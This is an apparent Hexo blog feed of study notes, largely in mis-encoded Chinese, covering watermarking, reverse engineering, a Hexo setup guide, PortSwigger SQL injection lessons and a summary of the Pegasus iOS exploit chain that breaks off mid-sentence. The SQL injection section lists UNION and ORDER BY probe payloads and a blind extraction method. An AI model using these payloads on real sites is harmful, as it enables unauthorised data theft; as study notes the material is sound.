functionï¼‰æ˜¯ä¸€ç§é™¤åœ¨ç»™å®šåŒºé—´ä¹‹å¤–å–å€¼å‡ä¸º0çš„å®å‡½æ•°ã€‚è­¬å¦‚ï¼šåœ¨ç»™å®šåŒºé—´å†…ä¸ºå¸¸æ•°è€Œåœ¨åŒºé—´å¤–ä¸º0çš„çª—å‡½æ•°è¢«å½¢è±¡åœ°ç§°ä¸ºçŸ©å½¢çª—ã€‚ä»»ä½•å‡½æ•°ä¸çª—å‡½æ•°ä¹‹ç§¯ä»ä¸ºçª—å‡½æ•°ï¼Œæ‰€ä»¥ç›¸ä¹˜çš„ç»“æœå°±åƒé€è¿‡çª—å£â€œçœ‹â€å…¶ä»–å‡½æ•°ä¸€æ ·</p><p>å˜æ¢(Transform)ã€é‡åŒ–(Quantization)å’Œç¼–ç (Coding)[<br>å¦å¤–ï¼Œå½“è¾“å…¥ä¿¡å·ä¸ºäºŒç»´æ—¶ï¼ˆä¾‹å¦‚ï¼šå½±åƒï¼‰ï¼ŒçŸ­æ—¶è·å‚…é‡Œå¶å˜æ¢çš„è¾“å‡ºä¸ºå››ç»´åº¦ï¼Œä½†å°æ³¢å˜æ¢ä»æ˜¯äºŒç»´ä¿¡å·ï¼Œæ‰€ä»¥åœ¨å½±åƒå¤„ç†ä¸Šé€šå¸¸ä¼šä½¿ç”¨å°æ³¢å˜æ¢è€ŒéçŸ­æ—¶è·å‚…é‡Œå¶å˜<br>æ¢ã€‚</p><p>Î£Î£ è¿™æ˜¯äºŒé‡æ±‚å’Œç¬¦å·<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i=m j=n</span><br><span class="line">..Î£... Î£ . . . . ai bj = a1b1+a1b2+ . . . +a1bn+</span><br><span class="line">i=<span class="number">1</span> j=<span class="number">1</span> . . . . . . .+a2b1+a2b2+ . . . +a2bn+</span><br><span class="line">. . . . . .. . . . . . . . . . +. . . . +</span><br><span class="line">. . . . . . . . . . . . . . . .+amb1+amb2+ . . . . +ambn.</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> watermark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;ç¬”è®°1</title>
      <link href="/2020/01/21/Medical%20Image%20WatermarkingTechniques%20and%20Applications%3E%3E%E7%AC%94%E8%AE%B01/"/>
      <url>/2020/01/21/Medical%20Image%20WatermarkingTechniques%20and%20Applications%3E%3E%E7%AC%94%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<ol><li>the  water-mark robustness is the key performance parameter.</li><li>a  watermark  can  be  embedded  in  every  frame.  </li><li>watermarking that pro-tects the content even after decryption<a id="more"></a></li><li>due  to  higher  data  embedding  capacity of image,</li><li>visible watermark is a secondary translu-cent  overlaid  into  the  primary  image. </li><li>Dual watermark is a combination of a visible and an invisible watermark </li><li>the  watermarking  system  consists  of  two  processes  -  encoding  and  extraction  process<br><img src="https://s2.ax1x.com/2020/01/21/1kQhQA.png" alt></li></ol><p>lossy compression æœ‰æŸå‹ç¼©<br>steganography  éšå†™æœ¯<br>obustness å¥å£®æ€§<br>exponentially æŒ‡æ•°åœ°<br>archiving å­˜æ¡£<br>geometrical å‡ ä½•<br>Classification åˆ†ç±»<br>Spatial ç©ºé—´çš„<br>cryptography å¯†ç å­¦<br>pixel åƒç´ ç‚¹ [ËˆpÉªksl]<br>designated  ç‰¹å®šçš„<br>confidentiality ä¿å¯†<br>on  account of ç”±äº<br>Tamper ç¯¡æ”¹<br>confidentiality æœºå¯†æ€§</p>]]></content>
      
      
      
        <tags>
            
            <tag> watermark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°4</title>
      <link href="/2019/11/29/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/"/>
      <url>/2019/11/29/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/</url>
      
        <content type="html"><![CDATA[<p>åœ¨PEæ–‡ä»¶ä¸­æ‰¾åˆ°ä»€ä¹ˆï¼Œåœ¨å†…å­˜åŒæ ·å¯ä»¥æ‰¾åˆ°</p><h5 id="PEæ–‡ä»¶ç»„æˆ"><a href="#PEæ–‡ä»¶ç»„æˆ" class="headerlink" title="PEæ–‡ä»¶ç»„æˆ"></a>PEæ–‡ä»¶ç»„æˆ</h5><pre><code>DOS header DOS stubPE file headerImage Optional HeaderSection tableData DirectoriesSections</code></pre><a id="more"></a><p>PE header é€šå¸¸ä½äº[imagebase]~[imagebase+1000]<br>memory double click</p><p>æ”¹å˜PE entry point ä»¥è·³è¿‡ä¸€äº›ä»£ç <br>binary fill with nops<br>PE headeré€šå¸¸å¤§å°æ˜¯1000h</p><p>EAT åº“ç”¨æ¥æ–¹ä¾¿å…¶ä»–ç¨‹åºä½¿ç”¨å‡½æ•°</p><h5 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h5><p>å¼¹å‡ºæ¶ˆæ¯æ¡†çš„åœ°æ–¹ï¼Œpasedï¼Œ alt+f9  , å†ç‚¹æ¶ˆæ¯æ¡†ï¼ˆ80%çš„æƒ…å†µä¸‹æœ‰ç”¨ï¼‰<br>åœ¨memoryçª—å£ä¸‹æœç´¢ï¼Œå†…å­˜ä¸­çš„æ•°æ®<br>find reference </p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°3</title>
      <link href="/2019/11/21/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/"/>
      <url>/2019/11/21/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/</url>
      
        <content type="html"><![CDATA[<ol><li>windowsç¨‹åºè¿è¡Œåœ¨Ring 3çº§ï¼Œä½†è¦è¿è¡Œåœ¨å†…æ ¸çº§ï¼ˆRing 0ï¼‰ï¼Œä½¿ç”¨APIè¯·æ±‚ï¼ŒAPIå­˜å‚¨åœ¨dllä¸­</li><li>FFFFFFFF==-1</li><li>åŒå‡»å¯æ”¹å˜FLAG å¯„å­˜å™¨å€¼<a id="more"></a></li><li>åŒå‡»EIPå›å» in ollydbg</li><li>info ä»ä¸€ä¸ªAPIä¸­è¿”å›æ€»åœ¨EAXä¸­</li><li>PEæ–‡ä»¶ã€‚å†…å­˜èŠ‚åŒºå¤´è¦åœ¨å„è‡ªæœ€å°åŸºæœ¬å•ä½çš„å€æ•°ä¸Šï¼Œæ‰€ä»¥ä½¿ç”¨NULLå¡«å……</li><li>RVA+imageBase==VA(ç»å¯¹åœ°å€ï¼‰</li><li>PEå¤´å†…éƒ¨ä½¿ç”¨RVA</li><li>4D5A =,,,MZ ï¼ˆPEæ–‡ä»¶å¼€å¤´ï¼ŒIMAGE_DOS_HEADER)</li><li>INTEL å°ç«¯åºï¼šï¼še_lfanew==000000E0</li><li>32ä½EXE ImageBase == 00400000</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bug</title>
      <link href="/2019/11/20/bug/"/>
      <url>/2019/11/20/bug/</url>
      
        <content type="html"><![CDATA[<ol><li>ä¿®å¤äº†å‘å¸ƒæ—¶é—´è¶…å‰çš„é—®é¢˜<br>â€“åœ¨é…ç½®æ–‡ä»¶ä¸­å°†æ—¶åŒºä¿®æ”¹ä¸º<code>Asia/Shanghai</code><br><del>2019-11-20 20:28:32 æ˜ŸæœŸä¸‰</del></li></ol><a id="more"></a>]]></content>
      
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°2</title>
      <link href="/2019/11/20/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/"/>
      <url>/2019/11/20/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<ol><li>æ ˆå°±æ˜¯ä¸€å°æ®µå†…å­˜ç©ºé—´ï¼Œå¤§å°è®°å½•åœ¨PEå¤´ä¸­</li><li>RETN 8 =RETN POP 8 stdcallæ¸…ç†æ–¹å¼ è¢«è°ƒç”¨è€…æ¸…ç†ï¼Œcdeclè°ƒç”¨è€…æ¸…ç†</li><li>Nags å” å¨</li><li>VB ThunRTMain å‡½æ•° è°ƒç”¨æ¶ˆæ¯æ¡† rtcMsgBox<a id="more"></a></li><li>Set Breakpoint on every call to rtcMsgBox</li><li>1 opcode == 1 byte</li><li>4 bytes == 1 dword</li><li>registers is 32 bit</li></ol><hr><h5 id="Lenaè§†é¢‘å­¦ä¹ "><a href="#Lenaè§†é¢‘å­¦ä¹ " class="headerlink" title="Lenaè§†é¢‘å­¦ä¹ "></a>Lenaè§†é¢‘å­¦ä¹ </h5><p><em>è¿™æ˜¯ä¹¦æœ¬ä»‹ç»çš„ï¼Œè¿™æ˜¯<a href="https://tuts4you.com/download/2876/" title="tuts4you" target="_blank" rel="noopener">tuts4you</a>crackmeä¸‹è½½åœ°å€ï¼Œé‡Œé¢è¿˜æœ‰è§†é¢‘æ•™ç¨‹å’Œä¸€äº›å…¶ä»–æ•™ç¨‹ã€‚</em></p><h5 id="Assembler-The-Basics-In-Reversing"><a href="#Assembler-The-Basics-In-Reversing" class="headerlink" title="Assembler : The Basics In Reversing"></a>Assembler : The Basics In Reversing</h5><p>SS stack segment<br>C-Flag &gt;FFFFFFFF  and &lt;0 æ—¶è®¾ç½®<br><code>segmens(a page in a book) + offsets(a specific line on that page)</code></p><pre><code>add eax,ebx                    ;; Register, Registeradd eax,123                    ;; Register, Valueadd eax,dword ptr [404000]            ;; Register, Dword Pointer [value]add eax,dword ptr [eax]            ;; Register, Dword Pointer [register]add eax,dword ptr [eax+00404000]    ;; Register, Dword Pointer [register+value]add dword ptr [404000],eax            ;; Dword Pointer [value], Registeradd dword ptr [404000],123        ;; Dword Pointer [value], Valueadd dword ptr [eax],eax            ;; Dword Pointer [register], Registeradd dword ptr [eax],123            ;; Dword Pointer [register], Valueadd dword ptr [eax+404000],eax        ;; Dword Pointer [register+value], Registeradd dword ptr [eax+404000],123        ;; Dword Pointer [register+value], value</code></pre><p>INT3 and INTO are interrupt calls that take no parameters but call the handlers for interrupts 3 and 4, respectively.</p><pre><code>JA*    -    Jump if (unsigned) above            - CF=0 and ZF=0JAE    -    Jump if (unsigned) above or equal        - CF=0JB*    -    Jump if (unsigned) below            - CF=1JBE    -    Jump if (unsigned) below or equal        - CF=1 or ZF=1JC    -    Jump if carry flag set            - CF=1JCXZ    -    Jump if CX is 0                - CX=0JE**    -    Jump if equal                    - ZF=1JECXZ    -    Jump if ECX is 0                - ECX=0JG*    -    Jump if (signed) greater            - ZF=0 and SF=OF (SF = Sign Flag)JGE*    -    Jump if (signed) greater or equal        - SF=OFJL*    -    Jump if (signed) less                - SF != OF (!= is not)JLE*    -    Jump if (signed) less or equal        - ZF=1 and OF != OFJMP**    -    Jump                        - Jumps alwaysJNA    -    Jump if (unsigned) not above        - CF=1 or ZF=1JNAE    -    Jump if (unsigned) not above or equal    - CF=1JNB    -    Jump if (unsigned) not below        - CF=0JNBE     -    Jump if (unsigned) not below or equal    - CF=0 and ZF=0JNC    -    Jump if carry flag not set            - CF=0JNE**    -    Jump if not equal                - ZF=0JNG    -    Jump if (signed) not greater            - ZF=1 or SF!=OFJNGE    -    Jump if (signed) not greater or equal    - SF!=OFJNL    -    Jump if (signed) not less            - SF=OFJNLE    -    Jump if (signed) not less or equal        - ZF=0 and SF=OFJNO    -    Jump if overflow flag not set        - OF=0JNP    -    Jump if parity flag not set            - PF=0JNS    -    Jump if sign flag not set            - SF=0JNZ    -    Jump if not zero                - ZF=0JO    -    Jump if overflow flag is set            - OF=1JP    -    Jump if parity flag set            - PF=1JPE    -    Jump if parity is equal            - PF=1JPO    -    Jump if parity is odd                - PF=0JS    -    Jump if sign flag is set            - SF=1JZ    -    Jump if zero                    - ZF=1</code></pre><h6 id="LEA-Load-Effective-Address"><a href="#LEA-Load-Effective-Address" class="headerlink" title="LEA (Load Effective Address)"></a>LEA (Load Effective Address)</h6><p>Syntax: LEA dest,src<br>LEA can be treated the same way as the MOV instruction. It isnâ€™t used too much for its original function, but more for quick multiplications like this:<br>   <code>lea eax, dword ptr [4*ecx+ebx]</code><br> <strong>which gives eax the value of 4*ecx+ebx</strong><br><del>ptr== pointer</del></p><h6 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h6><p>Syntax: POP dest<br>POP loads the value of byte/word/dword ptr <strong>[esp] jianæ¥å¯»å€ espæŒ‡å‘çš„å€¼zuo wei dizhi</strong>and puts it into dest. </p><h6 id="TEST"><a href="#TEST" class="headerlink" title="TEST"></a>TEST</h6><p>Syntax: TEST operand1, operand2<br>This instruction is in 99% of all cases used for â€œTEST EAX, EAXâ€. It performs a Logical<br>AND(AND instruction)<code>but does not save the values</code>.<strong> It only sets the Z-Flag, when EAX is 0 or clears it, when EAX is not 0. The O/C flags are always cleared.</strong></p><h6 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h6><p>Syntax: XOR dest,src<br>The XOR instruction connects two values using logical exclusive OR (remember OR uses inclusive OR).<br><code>This instruction clears the O-Flag and the C-Flag and can set the Z-Flag.</code><br>To understand XOR better, consider those two binary values:</p><pre><code>10010101100101001101</code></pre><p><code>If you XOR them, the result is 1100011011</code></p><p>The most often seen use of XOR is â€œXOR, EAX, EAXâ€.<code>This will set EAX to 0,</code> because when you XOR a value with itself, the result is always 0. I hope you understand why, else<br>write down a value on paper and try ;)</p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å­¦ä¹ ç¬”è®°1</title>
      <link href="/2019/11/19/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
      <url>/2019/11/19/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<p>ä¹°è¿™æœ¬ä¹¦æœ‰ä¸€å¹´äº†ï¼Œä½†åªçœ‹äº†ä¸€ç‚¹ç‚¹ï¼Œå¸Œæœ›èƒ½å­¦å®Œ</p><ol><li>ä¿å­˜æ›´æ”¹åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼Œ<em>1ä¿å­˜åˆ°COPY TO EXECUTABLE FILE</em>ï¼Œ<em>2é€‰æ‹©SAVE FILE</em></li><li>åº”ç”¨ç¨‹åºè¢«åŠ è½½åˆ°å†…å­˜æ—¶ï¼Œæœ‰ä¸€æœ€å°åˆ†é…ç©ºé—´</li><li>space = assembleï¼Œç”¨äºæ›´æ”¹ä»£ç <a id="more"></a></li><li>å¤§ç«¯åº 12 34 </li><li>å°ç«¯åº 34 12 ä¸€ä¸ªå­—èŠ‚é‡Œé¡ºåºä¸€æ ·</li><li>é€†åºå‹æ ˆï¼Œæ ˆFILO</li><li>æ ˆçª—å£ï¼Œaddress-relative to EBP</li><li>EBP ESP å­˜å‚¨çš„æ˜¯æ ˆåœ°å€-ã€‹ä»£è¡¨æ•°æ®</li><li>1.CALL å‹å…¥ä¸‹ä¸€åœ°å€ -1 2.PUSH å‹å…¥ä¸Šä¸€æ ˆå¸§åŸºåœ°å€ -1 3.MOV EBP ESP 4. MOV ESP EBP 5.POP EBP å–å‡ºåŸºåœ°å€ +1 6.RETN å–å‡ºä¸‹ä¸€åœ°å€+1</li><li>local å±€éƒ¨å˜é‡ ARG å‚æ•°</li><li>test = and =0 åˆ™ ZF=1 JE ZF=1 è·³è½¬</li><li>å±€éƒ¨å¯¹è±¡å­˜å‚¨åœ¨æ ˆåŒº</li><li>é€‰ä¸­åœ°å€ï¼ŒFollow in dump</li><li>dumpä¸­ï¼Œlong-address with ASCII dump</li><li>VBä½¿ç”¨unicode</li><li>API getâ€¦Text</li><li>è°ƒè¯•å‰é¢„æµ‹ä»£ç çš„å®ç°</li><li>å…ˆä¸Šæ‰˜ï¼Œæ‰¾åˆ°æ ˆå¸§ç”Ÿæˆéƒ¨åˆ†</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åœ¨æ–°ç”µè„‘ä¸Šé‡æ–°éƒ¨ç½²hexo</title>
      <link href="/2019/11/19/%E5%9C%A8%E6%96%B0%E7%94%B5%E8%84%91%E4%B8%8A%E9%87%8D%E6%96%B0%E9%83%A8%E7%BD%B2hexo/"/>
      <url>/2019/11/19/%E5%9C%A8%E6%96%B0%E7%94%B5%E8%84%91%E4%B8%8A%E9%87%8D%E6%96%B0%E9%83%A8%E7%BD%B2hexo/</url>
      
        <content type="html"><![CDATA[<p>è¿‘æœŸæœ‰äº†ä¸€å°æ–°ç”µè„‘ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°éƒ¨ç½²ä¸€ä¸‹hexoï¼Œæˆ‘çœ‹äº†å‡ ä¸ªæ•™ç¨‹ï¼Œå…¶å®å¾ˆç®€å•çš„ï¼Œå´å¼„å¤æ‚äº†</p><h4 id="1-å‰æœŸå‡†å¤‡"><a href="#1-å‰æœŸå‡†å¤‡" class="headerlink" title="1. å‰æœŸå‡†å¤‡"></a>1. å‰æœŸå‡†å¤‡</h4><p><a href="https://hexo.io/docs/" title="hexoå®‰è£…" target="_blank" rel="noopener">hexoå®‰è£…</a>éµå¾ªè¯¥é¡µé¢è¿›è¡Œ<strong>git</strong>å’Œ<strong>nodejs</strong>çš„å®‰è£…<br><code>å°†ä¹‹å‰çš„hexoæ–‡ä»¶æ•´ä¸ªæ‹·è´è¿‡æ¥</code><br><a id="more"></a></p><h4 id="2-é…ç½®SSH"><a href="#2-é…ç½®SSH" class="headerlink" title="2. é…ç½®SSH"></a>2. é…ç½®SSH</h4><p>ç”Ÿæˆrsaå…¬ç§é’¥</p><pre><code>$ cd ~/.ssh# Checks to see if there is a directory named &quot;.ssh&quot; in your user directory$ ssh-keygen -t rsa -C &quot;your_email@example.com&quot;# Creates a new ssh key using the provided emailGenerating public/private rsa key pair.Enter file in which to save the key (/home/you/.ssh/id_rsa):</code></pre><p>ç„¶ååœ¨GitHubé‡Œæ·»åŠ å…¬é’¥ï¼Œåœ¨é¡¹ç›®çš„settingé‡Œæœ‰ä¸€<code>deploy key</code>ï¼Œåœ¨è¿™é‡Œæ·»åŠ å…¬é’¥<br>ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤éªŒè¯</p><pre><code>ssh -T git@github.com</code></pre><p>å¦‚æœä¸è¡Œï¼Œå°±æ˜¯æ²¡æœ‰åœ¨<code>.ssh</code>æ–‡ä»¶å¤¹é‡Œåˆ›å»ºï¼Œéœ€è¦æ¥ä¸‹æ¥çš„ä¸¤æ­¥</p><pre><code>ssh-agent -sssh-add ~/.ssh/id_rsa</code></pre><p>è‹¥æç¤ºè¦è¾“å…¥å¯†ç ä»€ä¹ˆçš„ï¼Œåˆ™åœ¨<code>_config.yml</code>é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹<code>repo</code></p><pre><code>deploy:  type: git  repo: git@github.com:chengjianhua/chengjianhua.github.io.git  branch: master</code></pre><p>è¿™æ ·å°±å¯ä»¥äº†ï¼Œä¸ç”¨<code>npm install</code>æˆ–<code>initial</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> else </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite å®‰å…¨å­¦é™¢ç¬”è®°</title>
      <link href="/2019/05/17/sql-more-details/"/>
      <url>/2019/05/17/sql-more-details/</url>
      
        <content type="html"><![CDATA[<p>For a UNION query to work, two key requirements must be met:</p><ol><li><strong>The individual queries must return the same number of columns.</strong></li><li>The data types in each column must be compatible between the individual queries.</li></ol><p>â€˜ ORDER BY 1â€“<br>â€˜ ORDER BY 2â€“<br>â€˜ ORDER BY 3â€“</p><p>â€˜ UNION SELECT NULLâ€“<br>â€˜ UNION SELECT NULL,NULLâ€“<br>â€˜ UNION SELECT NULL,NULL,NULLâ€“<br><a id="more"></a><br>The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct.<br>On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called DUAL which can be used for this purpose. So the injected queries on Oracle would need to look like: â€˜ UNION SELECT NULL FROM DUALâ€“.<br>The payloads described use the double-dash comment sequence â€“ to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.</p><p>Database type     Query<br>Microsoft, MySQL     SELECT @@version<br>Oracle     SELECT * FROM v$version<br>PostgreSQL     SELECT version() </p><p>For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the â€œCluster bombâ€ attack type, and work through all permutations of offsets and character values. </p><p>Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The â€œStatusâ€ column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position. </p>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pegasusåˆ†æ</title>
      <link href="/2019/04/16/pegasus%E5%88%86%E6%9E%90/"/>
      <url>/2019/04/16/pegasus%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="PEGASUSæ”»å‡»åˆ†æ"><a href="#PEGASUSæ”»å‡»åˆ†æ" class="headerlink" title="PEGASUSæ”»å‡»åˆ†æ"></a>PEGASUSæ”»å‡»åˆ†æ</h1><h6 id="å‚è€ƒ-lookout-report"><a href="#å‚è€ƒ-lookout-report" class="headerlink" title="å‚è€ƒ lookout report"></a>å‚è€ƒ <a href="https://info.lookout.com/rs/051-ESQ-475/images/pegasus-exploits-technical-details.pdf" title="lookout report" target="_blank" rel="noopener">lookout report</a></h6><h3 id="æ”»å‡»è¿‡ç¨‹"><a href="#æ”»å‡»è¿‡ç¨‹" class="headerlink" title="æ”»å‡»è¿‡ç¨‹"></a>æ”»å‡»è¿‡ç¨‹</h3><p>å—å®³è€…ç‚¹å‡»é“¾æ¥ä¹‹åï¼Œæ”»å‡»è€…å±•å¼€æ”»å‡»ã€‚æ”»å‡»åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µéƒ½åŒ…å«äº†æ”»å‡»æ¨¡å—ä»£ç å’Œéšè”½è½¯ä»¶ã€‚æ”»å‡»æ˜¯çº¿æ€§çš„ï¼Œæ¯ä¸ªé˜¶æ®µéƒ½ä¾èµ–äºä¸Šä¸ªé˜¶æ®µçš„ä»£ç ã€éšè”½è½¯ä»¶çš„æˆåŠŸï¼Œæ¯ä¸ªé˜¶æ®µéƒ½ä½¿ç”¨äº†å…³é”®çš„0dayæ¼æ´ï¼Œä»¥ç¡®ä¿è¿›æ”»æˆåŠŸè¿›è¡Œã€‚</p><h5 id="é˜¶æ®µä¸€"><a href="#é˜¶æ®µä¸€" class="headerlink" title="é˜¶æ®µä¸€"></a>é˜¶æ®µä¸€</h5><p>ä¼ é€å¹¶åˆ©ç”¨WebKitæ¼æ´ï¼Œé€šè¿‡HTMLæ–‡ä»¶åˆ©ç”¨WebKitä¸­çš„CVE-2016-4657æ¼æ´ã€‚</p><h5 id="é˜¶æ®µäºŒ"><a href="#é˜¶æ®µäºŒ" class="headerlink" title="é˜¶æ®µäºŒ"></a>é˜¶æ®µäºŒ</h5><p>è¶Šç‹±ã€‚åœ¨ç¬¬ä¸€é˜¶æ®µä¸­ä¼šæ ¹æ®è®¾å¤‡ï¼ˆ32/64ä½ï¼‰ä¸‹è½½ç›¸åº”çš„ï¼Œç»è¿‡åŠ å¯†æ··æ·†çš„åŒ…ã€‚æ¯æ¬¡ä¸‹è½½çš„åŒ…éƒ½æ˜¯ç”¨ç‹¬ä¸€æ— äºŒçš„keyåŠ å¯†çš„ã€‚è½¯ä»¶åŒ…å†…åŒ…å«é’ˆå¯¹iOSå†…æ ¸ä¸¤ä¸ªæ¼æ´(CVE-2016-4655å’ŒCVE-2016-4656)çš„expè¿˜æœ‰ä¸€ä¸ªç”¨æ¥ä¸‹è½½è§£å¯†ç¬¬ä¸‰é˜¶æ®µè½¯ä»¶åŒ…çš„loaderã€‚</p><a id="more"></a><h5 id="é˜¶æ®µä¸‰"><a href="#é˜¶æ®µä¸‰" class="headerlink" title="é˜¶æ®µä¸‰"></a>é˜¶æ®µä¸‰</h5><p>å®‰è£…é—´è°è½¯ä»¶ã€‚ç»è¿‡äº†ç¬¬äºŒé˜¶æ®µçš„è¶Šç‹±ï¼Œç¬¬ä¸‰é˜¶æ®µä¸­ï¼Œæ”»å‡»è€…ä¼šé€‰æ‹©éœ€è¦ç›‘å¬çš„è½¯ä»¶ï¼ŒæŠŠhookå®‰è£…åˆ°åº”ç”¨ä¸­ã€‚å¦å¤–ï¼Œç¬¬ä¸‰é˜¶æ®µè¿˜ä¼šæ£€æŸ¥è®¾å¤‡ä¹‹å‰æœ‰æ²¡æœ‰é€šè¿‡å…¶ä»–æ–¹å¼è¶Šç‹±è¿‡ï¼Œå¦‚æœæœ‰ï¼Œåˆ™ä¼šç§»é™¤ä¹‹å‰è¶Šç‹±åå¼€æ”¾çš„ç³»ç»Ÿè®¿é—®æƒé™ï¼Œå¦‚sshã€‚è½¯ä»¶è¿˜æœ‰ä¸€ä¸ªâ€œæ•…éšœä¿é™©â€œï¼Œå¦‚æœæ£€æµ‹åˆ°è®¾å¤‡æ»¡è¶³æŸäº›æ¡ä»¶ï¼Œè½¯ä»¶å°±ä¼šè‡ªæ¯ã€‚</p><p>ç¬¬ä¸‰é˜¶æ®µä¸­ï¼Œé—´è°ä¼šéƒ¨ç½²ä¸€ä¸ªtest222.taræ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªtaråŒ…ï¼ŒåŒ…ä¸­åŒ…å«å„ç§å®ç°å„ç§ç›®çš„çš„æ–‡ä»¶ï¼Œå¦‚å®ç°ä¸­é—´äººæ”»å‡»çš„æ ¹TLSè¯ä¹¦ã€é’ˆå¯¹Viberã€Whatsappçš„å—…æ¢åº“ã€ä¸“é—¨ç”¨äºé€šè¯å½•éŸ³çš„åº“ç­‰ã€‚</p><h2 id="CVE-2016-4657"><a href="#CVE-2016-4657" class="headerlink" title="CVE-2016-4657"></a>CVE-2016-4657</h2><p>ç¬¬ä¸€é˜¶æ®µç”¨åˆ°äº†<strong>WebKitâ€™s JavaScriptCore library</strong> ä¸­çš„æ¼æ´<strong>CVE-2016-4657</strong>ã€‚è®©Safariè¿è¡Œä¸€æ®µJavaScript payloadï¼Œä»¥æ­¤æ¥è·å¾—Safari WebContentè¿›ç¨‹çš„ä»£ç æ‰§è¡Œæƒã€‚</p><h4 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h4><p>MarkedArgumentBufferä¸­çš„<strong>slowAppend()</strong>å‡½æ•°ä¸­å­˜åœ¨è¿™ä¸ªæ¼æ´ï¼Œå¹¶ä¸”å¯ä»¥åœ¨é™æ€æ–¹æ³•<strong>definePropertries()</strong>ä¸­ä½¿ç”¨MarkedArgumentBufferæ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚definePropertries()æ¥å—ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡çš„å¯æšä¸¾å˜é‡æ„æˆè¦åœ¨å¦ä¸€ä¸ªç›®æ 